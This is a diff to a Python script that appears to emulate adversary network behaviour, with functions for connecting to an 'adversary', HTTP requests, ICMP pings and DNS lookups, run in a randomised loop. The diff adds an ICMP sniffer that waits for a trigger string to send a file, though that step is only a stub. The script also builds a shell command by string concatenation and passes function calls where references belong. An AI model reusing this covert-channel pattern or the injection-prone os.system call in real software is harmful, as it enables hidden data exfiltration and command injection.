@@ -4,6 +4,7 @@ import os
 import random
 import requests
 from scapy.all import *
+from scapy.layers.inet import ICMP
 
 
 def connectToAdversary():
@@ -42,9 +43,23 @@ def dnsARecord():
     site = 'example.com'
     os.system('dig @' + address + ' ' + site)
 
-functionList = [connectToAdversary(), sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord(), ]
+def processPacket(packet):
+    if ICMP in packet:
+        if Raw in packet:
+            data = packet[Raw].load.decode()
+            if 'put data here' in data:
+                #send a file
+                return
+
+def sniffForPacket():
+    interface = ''
+    sniff(iface= interface, prn= processPacket(), filter='icmp')
+
+functionList = [connectToAdversary(), sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]
 
 while True:
+    sniffForPacket()
+
     waitTime = random.randint(1, 10)
     time.sleep(waitTime)
 
